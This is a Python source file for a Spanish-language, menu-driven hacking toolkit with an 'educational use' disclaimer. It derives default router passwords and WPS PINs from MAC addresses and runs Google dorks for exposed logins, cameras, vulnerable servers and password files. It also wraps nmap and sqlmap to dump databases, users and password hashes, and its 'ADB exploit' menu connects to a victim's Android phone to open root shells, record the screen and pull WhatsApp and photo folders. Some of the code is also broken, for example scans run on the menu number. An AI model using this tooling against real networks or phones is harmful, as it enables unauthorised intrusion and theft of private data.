#!/usr/bin/python
from termcolor import colored
from colorama import *
from googlesearch import *
import urllib.request
import subprocess
import wpspin
import time
import json
import os
init()

banner = """
  ███████████  ████                     █████               █████                       █████       ███   █████   
░░███░░░░░███░░███                    ░░███               ░░███                       ░░███       ░░░   ░░███    
 ░███    ░███ ░███   ██████    ██████  ░███ █████  █████  ███████    ██████  ████████  ░███ █████ ████  ███████  
 ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███  ███░░  ░░░███░    ███░░███░░███░░███ ░███░░███ ░░███ ░░░███░   
 ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░  ░░█████   ░███    ░███████  ░███ ░░░  ░██████░   ░███   ░███    
 ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███  ░░░░███  ░███ ███░███░░░   ░███      ░███░░███  ░███   ░███ ███
 ███████████  █████░░████████░░██████  ████ █████ ██████   ░░█████ ░░██████  █████     ████ █████ █████  ░░█████ 
░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░ ░░░░░░     ░░░░░   ░░░░░░  ░░░░░     ░░░░ ░░░░░ ░░░░░    ░░░░░  
                                                                                                                 
                                                                                                                 
"""

banner_1 = """
██╗██████╗ 
██║██╔══██╗
██║██████╔╝
██║██╔═══╝ 
██║██║     
╚═╝╚═╝     """


banner_2 = """
██████╗ ███████╗███████╗██╗  ██╗███████╗██╗   ██╗
██╔══██╗██╔════╝██╔════╝██║ ██╔╝██╔════╝╚██╗ ██╔╝
██║  ██║█████╗  █████╗  █████╔╝ █████╗   ╚████╔╝ 
██║  ██║██╔══╝  ██╔══╝  ██╔═██╗ ██╔══╝    ╚██╔╝  
██████╔╝███████╗██║     ██║  ██╗███████╗   ██║   
╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝
"""

banner_3 = """
  ______            _           
 / _____)          | |          
( (____   ____ ____| |__  _   _ 
 \____ \ / ___) ___)  _ \( \ / )
 _____) ) |  ( (___| | | |) X ( 
(______/|_|   \____)_| |_(_/ \_)
"""



banner_4 = """
::::    ::: ::::    ::::      :::     :::::::::                   :::     :::    ::: ::::::::::: ::::::::  
:+:+:   :+: +:+:+: :+:+:+   :+: :+:   :+:    :+:                :+: :+:   :+:    :+:     :+:    :+:    :+: 
:+:+:+  +:+ +:+ +:+:+ +:+  +:+   +:+  +:+    +:+               +:+   +:+  +:+    +:+     +:+    +:+    +:+ 
+#+ +:+ +#+ +#+  +:+  +#+ +#++:++#++: +#++:++#+ +#++:++#++:++ +#++:++#++: +#+    +:+     +#+    +#+    +:+ 
+#+  +#+#+# +#+       +#+ +#+     +#+ +#+                     +#+     +#+ +#+    +#+     +#+    +#+    +#+ 
#+#   #+#+# #+#       #+# #+#     #+# #+#                     #+#     #+# #+#    #+#     #+#    #+#    #+# 
###    #### ###       ### ###     ### ###                     ###     ###  ########      ###     ########  
"""



banner_5 = """
 .d8888b.   .d88888b.  888                d8888 888     888 88888888888 .d88888b.  
d88P  Y88b d88P" "Y88b 888               d88888 888     888     888    d88P" "Y88b 
Y88b.      888     888 888              d88P888 888     888     888    888     888 
 "Y888b.   888     888 888             d88P 888 888     888     888    888     888 
    "Y88b. 888     888 888            d88P  888 888     888     888    888     888 
      "888 888 Y8b 888 888    888888 d88P   888 888     888     888    888     888 
Y88b  d88P Y88b.Y8b88P 888          d8888888888 Y88b. .d88P     888    Y88b. .d88P 
 "Y8888P"   "Y888888"  88888888    d88P     888  "Y88888P"      888     "Y88888P"  
                  Y8b                                                              
            """



banner_6 = """
        _____   ______ _    _       _       _      
   /\  (____ \ (____  \ \  / /     | |     (_)_    
  /  \  _   \ \ ____)  ) \/ / ____ | | ___  _| |_  
 / /\ \| |   | |  __  ( )  ( |  _ \| |/ _ \| |  _) 
| |__| | |__/ /| |__)  ) /\ \| | | | | |_| | | |__ 
|______|_____/ |______/_/  \_\ ||_/|_|\___/|_|\___)
                             |_|          
           """



disclaimer = """
Esta herramienta fue creada para fines educativos y de practica, usela bajo su responsabilidad.
"""

def switch():
	os.system('cls')
	print(Fore.YELLOW)
	print(banner)
	time.sleep(1)
	print(Fore.GREEN)
	print("Creado por Blackster")
	time.sleep(1)
	print(disclaimer)
	time.sleep(1)
	menu = """
1- Obtener info de una IP.
2- Generador de Pines y Contraseñas Por defecto ( A partir de la MAC ).
3- Buscar Vulnerabilidades con Doorks.
4- Escaneos de Redes (nmap).
5- Ataque automatizado a Web (sqlmap).
6- Atacar Dispositivo por ADB.
7- Encontrar Directorios ocultos de un Host (dirb).
	"""
	print(Fore.GREEN)
	print(menu)
	return menu



while True:
	switch()
	ask = int(input("Escoge una opcion >>> "))
	if ask==1:
		os.system('cls')
		print(Fore.GREEN)
		print(banner_1)
		ask_ip = str(input("Introduce la IP >>> "))
		srch_ip = "https://ipinfo.io/"+ask_ip+"/json"
		url = urllib.request.urlopen(srch_ip)
		load = json.loads(url.read())
		for date in load:
			print(date + ">>>>>"+ load[date])
			time.sleep(1)
		print("\nCompletado, Presione una tecla para continuar...")
		input()

	elif ask==2:
		def defkey():
			os.system('cls')
			print(Fore.RED)
			print(banner_2)
			menu = """
>>> 1- Generar Password Router Movistar.
>>> 2- Generar Password Router ZTE.
>>> 3- Generar Password Router Huawei.
>>> 4- Generar Password Router DirecTV.
>>> 0- Atras.
			"""
			print(Fore.GREEN)
			print(menu)


		while True:
			defkey()
			ask_ = int(input("Escoge una opcion >>> "))
			if ask_==1:
				mac = str(input("Introduce aqui tu MAC >>> "))
				mov = 'M'
				convert = (mov+mac.upper())
				subprocess.run(f'wpspin -A {mac}')
				con_1 = convert[0:3]
				con_2 = convert[4:6]
				con_3 = convert[7:9]
				con_4 = convert[10:12]
				con_5 = convert[13:15]
				con_6 = convert[16:18]
				con_all = (con_1+con_2+con_3+con_4+con_5+con_6)
				#Hacemos la conversion inversa de la contraseña generada anteriormente.
				p_1 = convert[4:6]
				p_2 = convert[0:3]
				p_3 = convert[10:12]
				p_4 = convert[7:9]
				p_5 = convert[16:18]
				p_6 = convert[13:15]
				password = (mov+p_1+p_2+p_3+p_4+p_5+p_6)
				print(Fore.CYAN)
				#se imprime la salida del condicional.
				print("\nTu password por defecto para esta MAC es >> " + con_all + " << O prueba tambien con " + password)
				print("\nPresione una tecla para continuar...")
				input()

			elif ask_==2:
				mac = str(input("Introduce aqui tu MAC >>> "))
				zte = 'Z'
				convert = (zte+mac.upper())
				subprocess.run(f'wpspin -A {mac}')
				con_1 = convert[0:3]
				con_2 = convert[4:6]
				con_3 = convert[7:9]
				con_4 = convert[10:12]
				con_5 = convert[13:15]
				con_6 = convert[16:18]
				con_all = (con_1+con_2+con_3+con_4+con_5+con_6)
				#Hacemos la conversion inversa de la contraseña generada anteriormente.
				p_1 = convert[4:6]
				p_2 = convert[0:3]
				p_3 = convert[10:12]
				p_4 = convert[7:9]
				p_5 = convert[16:18]
				p_6 = convert[13:15]
				password = (zte+p_1+p_2+p_3+p_4+p_5+p_6)
				print(Fore.GREEN)
				#se imprime la salida del condicional.
				print("\nTu password por defecto para esta MAC es >> " + con_all + " << O prueba tambien con " + password)

			elif ask_==3:
				mac = str(input("Introduce aqui tu MAC >>> "))
				hua = 'H'
				convert = (hua+mac.upper())
				subprocess.run(f'wpspin -A {mac}')
				con_1 = convert[0:3]
				con_2 = convert[4:6]
				con_3 = convert[7:9]
				con_4 = convert[10:12]
				con_5 = convert[13:15]
				con_6 = convert[16:18]
				con_all = (con_1+con_2+con_3+con_4+con_5+con_6)
				#Hacemos la conversion inversa de la contraseña generada anteriormente.
				p_1 = convert[4:6]
				p_2 = convert[0:3]
				p_3 = convert[10:12]
				p_4 = convert[7:9]
				p_5 = convert[16:18]
				p_6 = convert[13:15]
				password = (hua+p_1+p_2+p_3+p_4+p_5+p_6)
				print(Fore.GREEN)
				#se imprime la salida del condicional.
				print("\nTu password por defecto para esta MAC es >> " + con_all + " << O prueba tambien con " + password)

			elif ask_==4:
				mac = str(input("Introduce aqui tu MAC >>> "))
				dtv = 'D'
				convert = (dtv+mac.upper())
				subprocess.run(f'wpspin -A {mac}')
				con_1 = convert[0:3]
				con_2 = convert[4:6]
				con_3 = convert[7:9]
				con_4 = convert[10:12]
				con_5 = convert[13:15]
				con_6 = convert[16:18]
				con_all = (con_1+con_2+con_3+con_4+con_5+con_6)
				#Hacemos la conversion inversa de la contraseña generada anteriormente.
				p_1 = convert[4:6]
				p_2 = convert[0:3]
				p_3 = convert[10:12]
				p_4 = convert[7:9]
				p_5 = convert[16:18]
				p_6 = convert[13:15]
				password = (dtv+p_1+p_2+p_3+p_4+p_5+p_6)
				print(Fore.GREEN)
				#se imprime la salida del condicional.
				print("\nTu password por defecto para esta MAC es >> " + con_all + " << O prueba tambien con " + password)

			elif ask_==0:
				break

	elif ask==3:
		def srchx():
			os.system('cls')
			print(Fore.CYAN)
			print(banner_3)
			print(Fore.GREEN)
			print("Creado by Blackster")
			menu = """
>>> 1- Paginas con portales de login.
>>> 2- Dispositivos Online.
>>> 3- Deteccion del servidor Web.
>>> 4- Avisos y vulnerabilidades.
>>> 5- Contraseñas de Usuarios y Admin (web).

>>> 0- Atras.
			"""
			print(Fore.YELLOW)
			print(menu)

		while True:
			srchx()
			ask = int(input("Escoge una opcion >>> "))
			if ask==1:
				log_por = "intitle:\"Component Browser Login\""
				for i in search(log_por, start=0, num=30, pause=2):
					print(Fore.GREEN)
					print(i)
					print("Presione una tecla para continuar...")
					input()

			elif ask==2:
				on_dev = "inurl:/view/viewer_index.shtml"
				for i in search(on_dev, start=0, num=30, pause=2):
					print(Fore.CYAN)
					print(i)
					print("Presione una tecla para continuar...")
					input()

			elif ask==3:
				web_serv = "inurl:CFIDE/adminapi"
				for i in search(web_serv, start=0, stop=30, pause=2):
					print(Fore.GREEN)
					print(i)
					print("Presione una tecla para continuar...")
					input()

			elif ask==4:
				vuln = "inurl:\"telerik.web.ui.webresource.axd?type=rau\""
				for i in search(vuln, start=0, stop=30, pause=2):
					print(Fore.YELLOW)
					print(i)
					print("Presione una tecla para continuar...")
					input()

			elif ask==5:
				Usr_ad = "ext:pwd inurl:(service | authors | administrators | users) “# -FrontPage-“"
				for i in search(Usr_ad, start=0, stop=30, pause=2):
					print(Fore.GREEN)
					print(i)
					print("Presione una tecla para continuar...")
					input()

			elif ask==0:
				break


	elif ask==4:
		def nmap():
			os.system('cls')
			print(Fore.YELLOW)
			print(banner_4)
			print(Fore.CYAN)
			print("Creado by Blackster")
			menu = """
>>> 1- Escaneo por Defecto.
>>> 2- Escaneo Listado.
>>> 3- Buscar Todos los host online.
>>> 4- Escanear sistema operativo(Root).
>>> 5- Escaneo de Ping.

>>> 0-Atras.
			"""
			print(menu)


		while True:
			nmap()
			ask = int(input("Escoge una opcion >>> "))
			if ask==1:
				host = str(input("Introduce el Host/IP a escanear >>> "))
				subprocess.run(f'nmap -sV -v {ask}')
				print("\nEscaneo Completo")
				time.sleep(1)
				print("\nPresione una tecla...")
				input()

			elif ask==2:
				host = str(input("Introduce el Host/IP a escanear >>> "))
				subprocess.run(f'nmap -sL -v {host}')
				print("\nEscaneo Completo")
				time.sleep(1)
				print("\nPresione una tecla...")
				input()

			elif ask==3:
				host = str(input("Introduce el Host/IP a escanear >>> "))
				subprocess.run(f'nmap -Pn -v {host}')
				print("\nEscaneo Completo")
				time.sleep(1)
				print("\nPresione una tecla...")
				input()

			elif ask==4:
				host = str(input("Introduce el Host/IP a escanear >>> "))
				subprocess.run(f'nmap -O -v {host}')
				print("\nEscaneo Completo")
				time.sleep(1)
				print("\nPresione una tecla...")
				input()

			elif ask==5:
				host = str(input("Introduce el Host/IP a escanear >>> "))
				subprocess.run(f'nmap -sn -v {host}')
				print("\nEscaneo Completo")
				time.sleep(1)
				print("\nPresione una tecla...")
				input()

			else:
				if ask==0:
					break

	elif ask==5:
		def sql():
			os.system('cls')
			print(Fore.RED)
			print(banner_5)
			print(Fore.YELLOW)
			print("Creado by Blackster")
			menu = """
>>> 1- Simple Inyeccion SQL.
>>> 2- Seleccionar una base de datos para filtrar.
>>> 3- Buscar Usuarios solamente.
>>> 4- Buscar Contraseñas(Hash).

>>> 0-Atras.
			"""
			print(menu)

		while True:
			sql()
			ask = int(input("Escoge una opcion >>> "))
			if ask==1:
				URL = str(input("Introduce aqui la URL a testear >>> "))
				subprocess.run(f'sqlmap -u {URL} --dbs')
				time.sleep(1)
				print("Presione una tecla para continuar...")
				input()

			elif ask==2:
				print("Importante!! Hacer esto despues de haber escogido la primera opcion...")
				time.sleep(1)
				quest = str(input("Desea continuar? (y/n): "))
				if quest=='y':
					try:
						URL = str(input("Introduce aqui la URL reciente >>> "))
						DB = str(input("Introduce el nombre de tu base de datos >>> "))
						subprocess.run(f'sqlmap -u {URL} -random-agent -level 5 -D {DB} --tables')
						print("Completado")
						print("\nPresione una tecla...")
						input()
					except:
						break

			elif ask==3:
				URL = str(input("Introduce aqui la URL a testear >>> "))
				subprocess.run(f'sqlmap -u {URL} --users')
				print(Completado)
				print("\nPresione una tecla para continuar...")
				input()

			elif ask==4:
				URL = str(input("Introduce aqui la URL a testear >>> "))
				subprocess.run(f'sqlmap -u {URL} --password')
				print(Completado)
				print("\nPresione una tecla para continuar...")
				input()

			else:
				if ask==0:
					break

	elif ask==6:
		def adbxploit():
			os.system('cls')
			print(Fore.RED)
			print(banner_6)
			print(Fore.CYAN)
			print("Creado by Blackster")
			menu = """
>> 0- Conectar ADB.
>> 1- Mostrar dispositivos ADB.
>> 2- Desconectar dispositivo.
<<<<<<<<<<< Comandos Hacking >>>>>>>>>>
¡¡Antes de usar estos comandos asegurate de estar conectado al disposistivo primero(ADB)!!
>> 3- Abrir una shell del Dispositivo.
>> 4- Tomar captura de pantalla del Dispositivo.
>> 5- Grabar pantalla del Dispositivo.
>> 6- Mostrar info del sistema.
>> 7- Listar paquetes instalados.
>> 8- Instalar una apk.
>> 9- Reiniciar Dispositivo.
>> 10- Desinstalar una apk.
>> 11- Habilitar Datos moviles.
>> 12- Extraer Apk del dispositivo.
>> 13- Mostrar info sobre CPU.
>> 14- Descargar un archivo desde el dispositivo.
>> 15- Descargar la carpeta de Whatsapp.
>> 16- Descargar la carpeta de Fotos.
>> 17- Correr una aplicacion en el dispositivo.

>> 99-Atras.
"""
			print(Fore.GREEN)
			print(menu)

		while True:
			adbxploit()
			ask = int(input("Escoe una opcion >>> "))
			if ask==0:
				print("Primero asegurate de tener la IP y el puerto correcto para conectarte al dispositivo Victima!!")
				time.sleep(2)
				print(Fore.GREEN)
				ip = str(input("\nIntroduce la IP aqui >> "))
				port = str(input("Introduce el puerto aqui >> "))
				out = (ip+':'+port)
				import subprocess
				subprocess.run(f'adb connect {out}')
				print("Presione una tecla para Continuar...")
				input()
				os.system('cls')

			elif ask==1:
				subprocess.run('adb devices')
				print("Presione una tecla para Continuar...")
				input()
				os.system('cls')
				print(Fore.RED)

			elif ask==2:
				ip = str(input("Introduce tu IP aqui >> "))
				disconnect = (ip+':'+"5555")
				subprocess.run(f'adb disconnect {disconnect}')
				time.sleep(3)
				os.system('cls')
				print(Fore.RED)

			elif ask==3:
				print("Antes de Continuar")
				menu = """
		1-Modo Root(superususario)
		2-Modo Normal(Algunas limitaciones)
		"""
				print(menu)
				root = int(input("Escoge una opcion >> "))
				if root==1:
					print("Ahora se abrira una shell del dispositivo en modo Root...")
					time.sleep(3)
					subprocess.run('adb root')
					subprocess.run('adb shell')
					time.sleep(1)
					os.system('cls')
					print(Fore.GREEN)
				elif root==2:
					print("Se abrira una shell en modo normal...")
					time.sleep(2)
					subprocess.run('adb shell')
					time.sleep(1)
					os.system('cls')
					print(Fore.GREEN)

			elif ask==4:
				print("Se tomara una captura de pantalla...")
				time.sleep(2)
				img = str(input("Introduce el nombre de tu imagen (ej: imagen1 ) >> "))
				ruta = str(input("Introduce tu ruta para guardar la captura >> "))
				subprocess.run(f'adb shell screencap -p /sdcard/{img}.png')
				time.sleep(1)
				subprocess.run(f'adb pull /sdcard/{img}.png {ruta}')
				print("Revisa la ruta para ver tu captura de pantalla")
				print("\nPresiona una tecla...")
				input()
				os.system('cls')
				print(Fore.RED)

			elif ask==5:
				seconds = int(input("Introduzca los segundos que desea Grabar la pantalla (ej: 20) >> "))
				vid = str(input("Introduce el nombre de tu video (ej: video1) >> "))
				ruta = str(input("Introduzca la ruta para guardar la grabacion >> "))
				subprocess.run(f'adb shell screenrecord --time-limit {seconds} --verbose ./sdcard/{vid}.mp4')
				time.sleep(1)
				subprocess.run(f'adb pull ./sdcard/{vid}.mp4 {ruta}')
				print("Revisa tu ruta para ver tu video")
				print("Presione una tecla...")
				print(Fore.MAGENTA)

			elif ask==6:
				subprocess.run('adb shell dumpsys')
				print("Presione una tecla.")
				input()
				print(Fore.RED)

			elif ask==7:
				subprocess.run('adb shell pm list packages')
				print("Presione una tecla.")
				input()
				os.system('cls')
				print(Fore.RED)

			elif ask==8:
				ruta = str(input("Escribe la ruta del archivo apk >> "))
				subprocess.run(f'adb install {ruta}')
				print("\nPresione una tecla para Continuar...")
				input()
				os.system('cls')
				print(Fore.GREEN)

			elif ask==7:
				subprocess.run('adb shell pm list packages',)
				print("Presione una tecla.")
				input()
				os.system('cls')
				print(Fore.RED)

			elif ask==8:
				ruta = str(input("Escribe la ruta del archivo apk >> "))
				subprocess.run(f'adb install {ruta}')
				print("\nPresione una tecla para Continuar...")
				input()
				os.system('cls')
				print(Fore.GREEN)

			elif ask==9:
				subprocess.run('adb reboot')
				os.system('cls')
				print(Fore.YELLOW)

			elif ask==10:
				n_p_a = str(input("Introduce el nombre del paquete de la aplicaciona Desinstalar (Escribelo bien) >> "))
				subprocess.run(f'adb uninstall {n_p_a}')
				print("Presione una tecla para Continuar...")
				input()
				os.system('cls')
				print(Fore.GREEN)

			elif ask==11:
				subprocess.run('adb shell svc data enable')
				time.sleep(2)
				print("Los Datos Moviles han sido Activados")
				print("\nPresione una tecla...")
				input()
				os.system('cls')
				print(Fore.RED)

			elif ask==12:
				path = str(input("Introduzca aqui el nombre del paquete de la APK (ej: com.example.aplication) >> "))
				subprocess.run(f'adb shell pm path {path} /sdcard/extraction.apk')
				time.sleep(2)
				ruta = str(input("Escriba la ruta donde desea guardar el archivo apk >> "))
				subprocess.run(f'adb pull /sdcard/extraction.apk {ruta}')
				print("Presione una tecla para Continuar...")
				input()
				print(Fore.YELLOW)

			elif ask==13:
				subprocess.run('adb shell cat/proc/cpuinfo')
				print("\nPresione una tecla para Continuar...")
				input()
				os.system('cls')
				print(Fore.MAGENTA)

			elif ask==14:
				print("¡¡Primero especifica la ruta del archivo o carpeta que quieres descargar del dispositivo !!")
				time.sleep(3)
				print(Fore.GREEN)
				ruta = str(input("Especifica la ruta del archivo o carpeta (ej: /sdcard/mifile.txt) >> "))
				destino = str(input("Especifique la ruta destino doonde guardara su archivo >> "))
				subprocess.run(f'adb pull {ruta} {destino}')
				print("Verifique su archivo...")
				print("Presione una tecla para continuar...")
				input()
				os.system('cls')
				print(Fore.GREEN)

			elif ask==15:
				print("¡Advertencia! \n Se descargara la carpeta de Whatsapp en caso de que esta exista, de lo contrario no servira.")
				time.sleep(2)
				ruta = "/sdcard/WhatsApp"
				destino = str(input("Introduzca la ruta destino donde se guardara la carpeta >> "))
				subprocess.run(f'adb pull {ruta} {destino}')
				print("Presione una tecla para continuar...")
				input()
				os.system('cls')
				print(Fore.MAGENTA)

			elif ask==16:
				print("Se descargara la carpeta de fotos\nsi no existe no funcionara")
				time.sleep(2)
				ruta = "/sdcard/DCIM"
				destino = str(input("Introduzca la ruta destino donde se guardara la carpeta >> "))
				subprocess.run(f'adb pull {ruta} {destino}')
				print("Presione una tecla para continuar...")
				input()
				os.system('cls')
				print(Fore.RED)

			elif ask==17:
				print("Vamos a correr una app...")
				time.sleep(2)
				ruta = str(input("Introduce el nombre del paquete a ejecutar >> "))
				subprocess.run(f'adb shell monkey -p {ruta} -c android.intent.category.LAUNCHER 0')

			else:
				if ask==99:
					try:
						break
					except:
						print("Introduce una opcion Valida!!")

	elif ask==7:
		try:
			host = str(input("Introduce un Host ej: http://127.0.0.1 >>> "))
			subprocess.run(f'dirb {host}')
		except:
			print("Se ha producido un error en el host")